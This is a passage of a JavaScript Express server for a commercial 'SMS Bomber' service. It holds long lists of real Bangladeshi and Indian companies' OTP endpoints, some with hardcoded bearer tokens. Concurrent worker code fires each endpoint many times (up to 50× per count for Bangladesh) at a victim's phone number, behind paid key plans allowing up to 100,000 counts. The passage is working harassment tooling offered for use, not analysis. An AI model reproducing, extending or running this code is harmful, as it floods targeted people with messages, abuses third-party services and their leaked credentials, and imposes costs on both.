  { name: "Robi Doorstep Bearer", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", headers: { "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" }, body: '{"phone_number":"{phone}","type":"doorstep"}' },
  { name: "Banglalink Number Validation", method: "GET", url: "https://web-api.banglalink.net/api/v1/user/number/validation/{phone}" },
  { name: "Fundesh Generate OTP", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: '{"msisdn":"{phone}"}' },
  { name: "China Online BD Token", method: "GET", url: "https://chinaonlinebd.com/api/login/getOtp?phone={phone}", headers: { "token": "45601f3d391886fcec5f5a3f26780f21" } },
  { name: "RedX User Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"Attack","phoneNumber":"{phone}","service":"redx"}' },
  { name: "Bioscope Operator OTP", method: "GET", url: "https://www.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp" },
  { name: "AppLink V4", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"88{phone}"}' },
  { name: "AWS POC OTP", method: "POST", url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", body: '{"phone":"{phone}"}' },
  { name: "QuizGiri JSON V2", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: '{"country_code":"+88","phone":"{phone}"}' },
  { name: "BD Matrimony V2", method: "GET", url: "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}" },
  { name: "GP FWA Shop", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: '{"phone":"{phone}","language":"en","email":""}' },
  { name: "EdgeCourseBD Register", method: "POST", url: "https://edgecoursebd.com/register", body: '[{"phone":"{phone}"}]' },
  { name: "MyGP Cinematic V2", method: "GET", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/" },
  { name: "Shomvob Bearer", method: "POST", url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", headers: { "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" }, body: '{"phone":"{phone}"}' },
  { name: "Win2gain Source", method: "GET", url: "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{phone}", headers: { "sourcePlatform": "web", "client": "2" } },
  { name: "Robi Internet Pack", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}","type":"internet_pack"}' },
  { name: "GP FWA Shop BN", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: '{"phone":"{phone}","email":"pro@bomber.com","language":"bn"}' },
  { name: "Dmoney OTP", method: "GET", url: "https://api.dmoney.com.bd/api/v1/otp/send?msisdn={phone}" },
  { name: "Nagad OTP", method: "POST", url: "https://api.nagad.com.bd/otp/send", body: '{"mobileNumber":"{phone}","service":"login"}' },
  { name: "SureCash OTP", method: "POST", url: "https://api.surecash.com.bd/v2/otp/generate", body: '{"msisdn":"{phone}"}' },
  { name: "Rocket Merchant OTP", method: "POST", url: "https://api.rocket.com.bd/merchant/otp", body: '{"account":"{phone}"}' },
  { name: "bKash OTP", method: "POST", url: "https://api.bkash.com.bd/otp/request", body: '{"phone":"{phone}","type":"registration"}' },
  { name: "Foodpanda BD OTP", method: "POST", url: "https://api.foodpanda.com.bd/v1/auth/otp", body: '{"phone":"+88{phone}"}' },
  { name: "Pathao OTP", method: "POST", url: "https://api.pathao.com/v2/auth/otp", body: '{"phone":"{phone}"}' },
  { name: "Daraz BD OTP", method: "POST", url: "https://api.daraz.com.bd/auth/otp", body: '{"mobile":"{phone}"}' },
  { name: "PriyoShop OTP", method: "POST", url: "https://api.priyoshop.com/v1/otp/send", body: '{"phone":"{phone}"}' },
  { name: "AjkerDeal OTP", method: "GET", url: "https://ajkerdeal.com/api/v1/otp?phone={phone}" },
  { name: "Evaly OTP", method: "POST", url: "https://api.evaly.com.bd/auth/otp", body: '{"phone":"{phone}"}' },
  { name: "Chaldal OTP", method: "POST", url: "https://api.chaldal.com/v1/auth/otp", body: '{"phone":"{phone}"}' },
  { name: "Shurjopay OTP", method: "POST", url: "https://api.shurjopay.com.bd/otp/send", body: '{"phone":"{phone}"}' },
  { name: "SSLWireless OTP", method: "POST", url: "https://sslwireless.com/api/otp", body: '{"msisdn":"{phone}"}' },
  { name: "Robi Voice", method: "POST", url: "https://api.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}","type":"voice"}' },
  { name: "MyGP OTP Login", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}" },
  { name: "Banglalink Selfcare", method: "POST", url: "https://selfcare.banglalink.net/api/v1/otp", body: '{"msisdn":"{phone}"}' },
  { name: "Teletalk OTP", method: "POST", url: "https://teletalk.com.bd/api/otp/send", body: '{"number":"{phone}"}' },
  { name: "Sundarban SendPin V2", method: "POST", url: "https://tracking.sundarbancourierltd.com/PreBooking/SendPin", body: '{"PreBookingRegistrationPhoneNumber":"0{phone}"}' },
  { name: "Rokomari OTP", method: "GET", url: "https://www.rokomari.com/otp/send?emailOrPhone=880{phone}&countryCode=BD" },
  { name: "Paperfly Registration", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: '{"full_name":"Test User","company_name":"Test Co","email_address":"test@example.com","phone_number":"0{phone}"}' },
  { name: "Eon Bazar Registration", method: "POST", url: "https://app.eonbazar.com/api/auth/register", body: '{"mobile":"0{phone}","name":"Test User","password":"Test@123","email":"test{phone}@example.com"}' }
];

// প্রতিটি API দুইবার (V1 + V2)
const BD_APIS = [];
for (const a of BD_APIS_RAW) {
  BD_APIS.push({ ...a, name: `${a.name} V1` });
  BD_APIS.push({ ...a, name: `${a.name} V2` });
}

// ============================================================
// INDIAN API LIST (Full Dump — অপরিবর্তিত)
// ============================================================
const INDIAN_APIS = [
  { name: "Meesho WhatsApp", method: "POST", url: "https://meesho.com/gw/login-register/v1/sendOTP", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Meesho Call", method: "POST", url: "https://meesho.com/api/v1/auth/otpsend", body: '{"mobile":"{phone}"}' },
  { name: "Flipkart WhatsApp", method: "POST", url: "https://flipkart.com/api/v2/otpgenerate", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Flipkart Call", method: "POST", url: "https://flipkart.com/v3/auth/otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Myntra SMS", method: "POST", url: "https://myntra.com/api/v3/user/otp", body: '{"mobileNumber":"{phone}"}' },
  { name: "Myntra WhatsApp", method: "POST", url: "https://myntra.com/v3/auth/otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Ajio WhatsApp", method: "POST", url: "https://ajio.com/gw/login-register/v1/sendOTP", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Nykaa SMS", method: "POST", url: "https://nykaa.com/api/v3/user/otp", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Nykaa WhatsApp", method: "POST", url: "https://nykaa.com/api/v2/auth/send-otp", body: '{"mobile":"{phone}"}' },
  { name: "Bigbasket WhatsApp", method: "POST", url: "https://bigbasket.com/api/v1/customers/sendOtp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Bigbasket SMS", method: "POST", url: "https://bigbasket.com/api/v3/user/otp", body: '{"mobileNumber":"{phone}"}' },
  { name: "Zepto WhatsApp", method: "POST", url: "https://zepto.com/api/v3/user/otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Zepto SMS", method: "POST", url: "https://zepto.com/v3/auth/otp", body: '{"mobile":"{phone}"}' },
  { name: "Blinkit SMS", method: "POST", url: "https://blinkit.com/v1/user/otplogin", body: '{"mobile":"{phone}"}' },
  { name: "Blinkit WhatsApp", method: "POST", url: "https://blinkit.com/api/v2/auth/send-otp", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Instamart SMS", method: "POST", url: "https://instamart.com/api/v2/auth/send-otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Dmart SMS", method: "POST", url: "https://dmart.ready.in/v3/auth/otp", body: '{"mobileNumber":"{phone}"}' },
  { name: "Dmart Call", method: "POST", url: "https://dmart.ready.in/api/v3/user/otp", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Newme WhatsApp", method: "POST", url: "https://newme.asia/v3/auth/otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Newme Call", method: "POST", url: "https://newme.asia/api/v1/auth/otpsend", body: '{"mobile":"{phone}"}' },
  { name: "Wakefit SMS", method: "POST", url: "https://wakefit.co/api/v3/user/otp", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Wakefit WhatsApp", method: "POST", url: "https://wakefit.co/api/v2/auth/send-otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Zivame WhatsApp", method: "POST", url: "https://zivame.com/gw/login-register/v1/sendOTP", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Zivame Call", method: "POST", url: "https://zivame.com/api/v1/customers/sendOtp", body: '{"mobileNumber":"{phone}"}' },
  { name: "Lenskart Call", method: "POST", url: "https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Lenskart SMS", method: "POST", url: "https://api-gateway.juno.lenskart.com/api/v2/otpgenerate", body: '{"mobileNumber":"{phone}"}' },
  { name: "Swiggy WhatsApp", method: "POST", url: "https://swiggy.com/v1/user/otplogin", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Swiggy SMS", method: "POST", url: "https://swiggy.com/api/v2/otpgenerate", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Zomato WhatsApp", method: "POST", url: "https://zomato.com/gw/login-register/v1/sendOTP", body: '{"mobileNumber":"{phone}"}' },
  { name: "Zomato SMS", method: "POST", url: "https://zomato.com/api/v2/auth/send-otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Uber WhatsApp", method: "POST", url: "https://uber.com/api/v2/auth/send-otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Uber SMS", method: "POST", url: "https://uber.com/gw/login-register/v1/sendOTP", body: '{"mobileNumber":"{phone}"}' },
  { name: "Olacabs WhatsApp", method: "POST", url: "https://olacabs.com/api/v2/login/sendotp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Olacabs SMS", method: "POST", url: "https://olacabs.com/v1/user/otplogin", body: '{"mobileNumber":"{phone}"}' },
  { name: "Rapido SMS", method: "POST", url: "https://rapido.bike/api/v2/auth/send-otp", body: '{"mobile":"{phone}"}' },
  { name: "Rapido WhatsApp", method: "POST", url: "https://rapido.bike/gw/login-register/v1/sendOTP", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Goibibo WhatsApp", method: "POST", url: "https://goibibo.com/api/v2/auth/send-otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Goibibo SMS", method: "POST", url: "https://goibibo.com/api/v2/login/sendotp", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Makemytrip WhatsApp", method: "POST", url: "https://makemytrip.com/api/v2/auth/send-otp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Makemytrip SMS", method: "POST", url: "https://makemytrip.com/api/v1/auth/otpsend", body: '{"mobileNumber":"{phone}"}' },
  { name: "Oyorooms WhatsApp", method: "POST", url: "https://oyorooms.com/v1/user/otplogin", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Oyorooms SMS", method: "POST", url: "https://oyorooms.com/api/v3/user/otp", body: '{"mobile":"{phone}"}' },
  { name: "Paytm WhatsApp", method: "POST", url: "https://paytm.com/v1/user/otplogin", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Paytm SMS", method: "POST", url: "https://paytm.com/api/v2/login/sendotp", body: '{"mobile":"{phone}"}' },
  { name: "Phonepe WhatsApp", method: "POST", url: "https://phonepe.com/v3/auth/otp", body: '{"mobileNumber":"{phone}"}' },
  { name: "Phonepe SMS", method: "POST", url: "https://phonepe.com/api/v1/auth/otpsend", body: '{"mobile":"{phone}"}' },
  { name: "Cred WhatsApp", method: "POST", url: "https://cred.club/api/v2/auth/send-otp", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Cred SMS", method: "POST", url: "https://cred.club/api/v1/auth/otpsend", body: '{"mobileNumber":"{phone}"}' },
  { name: "Jupiter WhatsApp", method: "POST", url: "https://jupiter.money/api/v2/auth/send-otp", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Jupiter SMS", method: "POST", url: "https://jupiter.money/api/v2/login/sendotp", body: '{"mobile":"{phone}"}' },
  { name: "Khatabook WhatsApp", method: "POST", url: "https://khatabook.com/api/v3/user/otp", body: '{"mobileNumber":"{phone}"}' },
  { name: "Khatabook SMS", method: "POST", url: "https://khatabook.com/api/v1/auth/otpsend", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Tatacapital WhatsApp", method: "POST", url: "https://tatacapital.com/api/v2/auth/send-otp", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Tatacapital SMS", method: "POST", url: "https://tatacapital.com/v1/user/otplogin", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Pharmeasy WhatsApp", method: "POST", url: "https://pharmeasy.in/api/v2/auth/send-otp", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Pharmeasy SMS", method: "POST", url: "https://pharmeasy.in/api/v2/login/sendotp", body: '{"mobile":"{phone}"}' },
  { name: "1Mg SMS", method: "POST", url: "https://1mg.com/api/v2/login/sendotp", body: '{"mobileNumber":"{phone}"}' },
  { name: "1Mg WhatsApp", method: "POST", url: "https://1mg.com/api/v2/otpgenerate", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Doubtnut WhatsApp", method: "POST", url: "https://doubtnut.com/api/v2/otpgenerate", body: '{"mobile":"{phone}"}' },
  { name: "Doubtnut SMS", method: "POST", url: "https://doubtnut.com/api/v1/customers/sendOtp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Shiprocket WhatsApp", method: "POST", url: "https://shiprocket.in/v1/user/otplogin", body: '{"phoneNumber":"{phone}","otpType":"voice"}' },
  { name: "Shiprocket SMS", method: "POST", url: "https://shiprocket.in/api/v2/login/sendotp", body: '{"mobile":"{phone}"}' },
  { name: "Gokwik WhatsApp", method: "POST", url: "https://gokwik.co/api/v1/auth/otpsend", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Gokwik SMS", method: "POST", url: "https://gokwik.co/api/v1/customers/sendOtp", body: '{"mobile":"{phone}"}' },
  { name: "Amazon WhatsApp", method: "POST", url: "https://amazon.in/api/v1/auth/otpsend", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "Amazon SMS", method: "POST", url: "https://amazon.in/api/v2/auth/send-otp", body: '{"mobile":"{phone}"}' },
  { name: "Pokerbaazi WhatsApp", method: "POST", url: "https://pokerbaazi.com/v1/user/otplogin", body: '{"number":"{phone}","otpOnCall":true}' },
  { name: "Pokerbaazi SMS", method: "POST", url: "https://pokerbaazi.com/api/v2/login/sendotp", body: '{"phone":"{phone}","countryCode":"91"}' },
  { name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: '{"phone":"{phone}","city":362}' },
  { name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: '{"phone":"{phone}","email":"test@example.com"}' },
  { name: "MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: '{"phoneNumber":"{phone}","channel":"SMS"}' },
  { name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: '{"phone":"{phone}","country_url_name":"in"}' },
  { name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: '{"phone":"{phone}"}' },
  { name: "Khatabook v1", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}' },
  { name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}' },
  { name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: '{"phone":"{phone}","version":"1.4.28"}' },
  { name: "Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: '{"mobile":"{phone}"}' },
  { name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}' },
  { name: "Doubtnut v4", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: '{"phone_number":"{phone}","language":"en"}' },
  { name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}' },
  { name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" }
];

function dedupe(list) {
  const seen = new Set(), out = [];
  for (const a of list) {
    const key = `${a.method}::${a.url}`;
    if (seen.has(key)) continue;
    seen.add(key); out.push(a);
  }
  return out;
}
// ⚠️ BD_APIS duplicate ইচ্ছাকৃত, তাই dedupe নয়
const BD_DEDUP = BD_APIS;
const IN_DEDUP = dedupe(INDIAN_APIS);
console.log(`📡 BD APIs: ${BD_DEDUP.length} (unique: ${BD_APIS_RAW.length} × 2)`);
console.log(`🇮🇳 IN APIs: ${IN_DEDUP.length}`);

// ============================================================
// JOB STORE
// ============================================================
class JobStore {
  constructor() {
    this.active = new Map();
    this.completed = new Map();
    this.stats = { totalJobs: 0, totalSuccess: 0, totalFailed: 0, startTime: Date.now() };
  }
  create({ phone, region, total, opts = {} }) {
    const id = Utility.generateJobId();
    const job = {
      id, phone, masked: Utility.maskPhone(phone), region, total,
      sent: 0, success: 0, fail: 0, startTime: Date.now(),
      status: 'active', opts, errors: [], stopped: false
    };
    this.active.set(id, job);
    this.stats.totalJobs++;
    return id;
  }
  isActive(id) {
    const j = this.active.get(id);
    return j && !j.stopped && j.status === 'active';
  }
  stop(id) {
    const j = this.active.get(id);
    if (!j) return false;
    j.stopped = true; j.status = 'stopped'; j.endTime = Date.now();
    this.active.delete(id); this.completed.set(id, j);
    return true;
  }
  stopAll(region = null) {
    let c = 0;
    for (const [id, j] of [...this.active.entries()]) {
      if (region && j.region !== region) continue;
      if (this.stop(id)) c++;
    }
    return c;
  }
  bump(id, ok, err = null) {
    const j = this.active.get(id);
    if (!j || j.stopped) return;
    j.sent++;
    if (ok) { j.success++; this.stats.totalSuccess++; }
    else {
      j.fail++; this.stats.totalFailed++;
      if (err && j.errors.length < 30) j.errors.push(String(err).slice(0, 200));
    }
    if (j.sent >= j.total) {
      j.status = 'completed'; j.endTime = Date.now();
      this.active.delete(id); this.completed.set(id, j);
    }
  }
  view(id) {
    const j = this.active.get(id) || this.completed.get(id);
    if (!j) return null;
    return {
      id: j.id, phone: j.masked, region: j.region,
      total: j.total, sent: j.sent, success: j.success, fail: j.fail,
      progress: ((j.sent / j.total) * 100).toFixed(2) + '%',
      status: j.status, start: j.startTime, end: j.endTime || null,
      stopped: j.stopped, errors: j.errors.slice(-5)
    };
  }
  all() {
    const out = [];
    for (const j of this.active.values()) out.push(this.view(j.id));
    for (const j of this.completed.values()) out.push(this.view(j.id));
    return out;
  }
  summary() {
    const tot = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs,
      totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: tot > 0 ? ((this.stats.totalSuccess / tot) * 100).toFixed(2) + '%' : '0%',
      active: this.active.size,
      completed: this.completed.size,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memory: Utility.getMemoryUsage()
    };
  }
}
const jobs = new JobStore();

// ============================================================
// KEYS
// ============================================================
const PLAN_CONFIG = {
  default:    { name: 'Default',    maxCount: 300,    requiresKey: false },
  free:       { name: 'Free',       maxCount: 50,     requiresKey: false },
  premium:    { name: 'Premium',    maxCount: 10000,  requiresKey: true  },
  enterprise: { name: 'Enterprise', maxCount: 50000,  requiresKey: true  },
  unlimited:  { name: 'Unlimited',  maxCount: 100000, requiresKey: true  }
};
class KeyManager {
  constructor() {
    this.file = path.join(__dirname, 'keys.json');
    this.keys = this.load();
  }
  load() {
    try {
      if (fs.existsSync(this.file)) {
        const data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        const m = new Map();
        Object.entries(data).forEach(([k, v]) => m.set(k, {
          expiry: new Date(v.expiry),
          plan: v.plan,
          usageCount: v.usageCount || 0
        }));
        return m;
      }
    } catch {}
    return new Map();
  }
  save() {
    const obj = {};
    for (const [k, v] of this.keys.entries()) obj[k] = {
      expiry: v.expiry.toISOString(),
      plan: v.plan,
      usageCount: v.usageCount || 0
    };
    fs.writeFileSync(this.file, JSON.stringify(obj, null, 2));
  }
  mint(plan = 'premium', days = 30) {
    const key = Utility.generateApiKey();
    const expiry = new Date(); expiry.setDate(expiry.getDate() + days);
    this.keys.set(key, { expiry, plan, usageCount: 0 });
    this.save();
    return { apiKey: key, expiryDate: expiry, plan };
  }
  validate(key) { return this.keys.has(key) && new Date() < this.keys.get(key).expiry; }
  info(key) {
    if (!this.keys.has(key)) return null;
    const k = this.keys.get(key);
    return {
      key, plan: k.plan, expires: k.expiry.toISOString(),
      valid: new Date() < k.expiry,
      daysLeft: Math.max(0, Math.ceil((k.expiry - new Date()) / 86400000)),
      usageCount: k.usageCount
    };
  }
  use(key) {
    const k = this.keys.get(key);
    if (!k) return false;
    k.usageCount = (k.usageCount || 0) + 1;
    this.save();
    return true;
  }
  all() {
    const out = [];
    for (const [k, v] of this.keys.entries()) out.push({
      key: k, plan: v.plan, expires: v.expiry.toISOString(),
      valid: new Date() < v.expiry, usageCount: v.usageCount || 0
    });
    return out;
  }
}
const keys = new KeyManager();

// ============================================================
// ENGINE
// ============================================================
function expandBody(obj, phone) {
  if (obj === null || obj === undefined) return obj;
  if (Array.isArray(obj)) return obj.map(v => expandBody(v, phone));
  if (typeof obj === 'object') {
    const o = {};
    for (const [k, v] of Object.entries(obj)) o[k] = expandBody(v, phone);
    return o;
  }
  if (typeof obj === 'string') {
    return obj.replace(/{phone}/g, phone).replace(/{ts}/g, Date.now());
  }
  return obj;
}

async function callOne(api, phone, jobId) {
  if (!jobs.isActive(jobId)) return { stopped: true };

  let url = api.url.replace(/{phone}/g, phone).replace(/{ts}/g, Date.now());
  let origin = '';
  try { origin = new URL(url).origin; } catch {}

  const headers = getHeaders({
    ...(origin ? { 'Origin': origin, 'Referer': origin + '/' } : {}),
    ...(api.headers || {})
  });

  const cfg = {
    method: api.method,
    url,
    headers,
    timeout: api.timeout || CONFIG.performance.timeout,
    validateStatus: () => true,
    maxRedirects: 3,
    responseType: 'text'
  };

  if (api.method === 'POST' && api.body) {
    let data = expandBody(api.body, phone);
    if (api.isFormData && typeof data === 'object') {
      cfg.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      cfg.data = new URLSearchParams(data).toString();
    } else if (typeof data === 'object') {
      cfg.headers['Content-Type'] = 'application/json';
      cfg.data = JSON.stringify(data);
    } else {
      cfg.headers['Content-Type'] = 'application/json';
      cfg.data = data;
    }
  }

  let status = 0, ok = false, errMsg = null, respBody = '';
  try {
    const r = await axios(cfg);
    status = r.status;
    respBody = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
    const bodyLower = respBody.toLowerCase();
    const hasSuccessKeyword =
      bodyLower.includes('otp') ||
      bodyLower.includes('success') ||
      bodyLower.includes('sent') ||
      bodyLower.includes('"status":true') ||
      bodyLower.includes('"success":true') ||
      bodyLower.includes('"isvalid":true') ||
      bodyLower.includes('"message":"ok"');
    ok = (status >= 200 && status < 300) && (hasSuccessKeyword || respBody.length < 50);
    if (!ok && status >= 200) errMsg = `2xx no OTP keyword (${respBody.slice(0, 60)})`;
  } catch (e) {
    status = e.response ? e.response.status : 0;
    errMsg = (e.code || e.message || 'ERR').slice(0, 120);
    if (e.response && e.response.data) {
      try {
        const d = typeof e.response.data === 'string' ? e.response.data : JSON.stringify(e.response.data);
        errMsg += ` | ${d.slice(0, 80)}`;
      } catch {}
    }
    ok = false;
  }
  return { ok, status, error: errMsg };
}

async function blast(apis, phone, count, jobId, region) {
  // BD-এর জন্য count × 50 multiplier (আপনার original logic)
  const perApiCount = region === 'BD' ? (parseInt(count) || 1) * 50 : (parseInt(count) || 1);

  const queue = [];
  for (const api of apis) {
    for (let i = 0; i < perApiCount; i++) {
      queue.push({ api, phone, jobId });
    }
  }

  const t0 = Date.now();
  const CONCURRENCY = CONFIG.performance.concurrency;
  let cursor = 0, fired = 0;

  async function worker() {
    while (cursor < queue.length) {
      if (!jobs.isActive(jobId)) return;
      const idx = cursor++;
      const item = queue[idx];
      const r = await callOne(item.api, item.phone, item.jobId);
      fired++;
      if (!r.stopped) jobs.bump(jobId, r.ok, r.error);
    }
  }

  const workers = [];
  for (let i = 0; i < CONCURRENCY; i++) workers.push(worker());
  await Promise.all(workers);

  console.log(`💥 ${region} job ${jobId}: ${fired}/${queue.length} calls in ${Date.now() - t0}ms`);
  return { fired, queued: queue.length };
}

// ============================================================
// EXPRESS
// ============================================================
const app = express();
app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

app.get('/', (req, res) => {
  const p = path.join(__dirname, '../public/index.html');
  if (fs.existsSync(p)) return res.sendFile(p);
  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V9.0-TNEH running' });
});

app.get('/api', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    version: "9.0.0-TNEH",
    bd_apis_total: BD_DEDUP.length,
    bd_unique: BD_APIS_RAW.length,
    india_apis: IN_DEDUP.length
  });
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'active',
    version: "9.0.0-TNEH",
    bd_apis: BD_DEDUP.length,
    bd_unique: BD_APIS_RAW.length,
    india_apis: IN_DEDUP.length,
    active_jobs: jobs.active.size
  });
});

app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key } = req.query;
  let planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) planConfig = PLAN_CONFIG[plan];

  if (planConfig.requiresKey) {
    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
    keys.use(key);
  }
  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });

  const clean = Utility.normalizeBD(number);
  if (!Utility.isValidBD(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });

  let per = parseInt(count) || 1;
  if (per < 1) per = 1;
  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });

  const finalPerApi = per * 50;
  const totalCalls = BD_DEDUP.length * finalPerApi;

  const jobId = jobs.create({ phone: clean, region: 'BD', total: totalCalls });
  blast(BD_DEDUP, clean, per, jobId, 'BD').catch(e => { console.error(e); jobs.stop(jobId); });

  res.json({
    success: true, jobId, region: 'BD',
    total_unique: BD_APIS_RAW.length,
    total_with_dup: BD_DEDUP.length,
    calls_per_api: finalPerApi,
    total_sms: totalCalls,
    status_endpoint: `/api/status?jobId=${jobId}`,
    stop_endpoint: `/api/stop?jobId=${jobId}`
  });
});

app.get('/api/India', async (req, res) => {
  if (req.query.stop !== undefined) {
    const jobid = req.query.jobid || req.query.jobId;
    if (jobid === 'all' || req.query.stop === 'all') return res.json({ success: true, stopped_count: jobs.stopAll('IN') });
    if (!jobid) return res.status(400).json({ success: false, error: 'jobid required' });
    return res.json({ success: jobs.stop(jobid), jobId: jobid });
  }
  const { number, count = 1, plan, key } = req.query;
  let planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) planConfig = PLAN_CONFIG[plan];

  if (planConfig.requiresKey) {
    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
    keys.use(key);
  }
  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });

  const clean = Utility.normalizeIN(number);
  if (!Utility.isValidIN(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });

  let per = parseInt(count) || 1;
  if (per < 1) per = 1;
  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });

  const totalCalls = IN_DEDUP.length * per;
  const jobId = jobs.create({ phone: clean, region: 'IN', total: totalCalls });
  blast(IN_DEDUP, clean, per, jobId, 'IN').catch(e => { console.error(e); jobs.stop(jobId); });

  res.json({
    success: true, jobId, region: 'IN',
    total_apis: IN_DEDUP.length,
    calls_per_api: per,
    total_sms: totalCalls,
    status_endpoint: `/api/status?jobId=${jobId}`,
    stop_endpoint: `/api/India?stop&jobid=${jobId}`
  });
});

app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
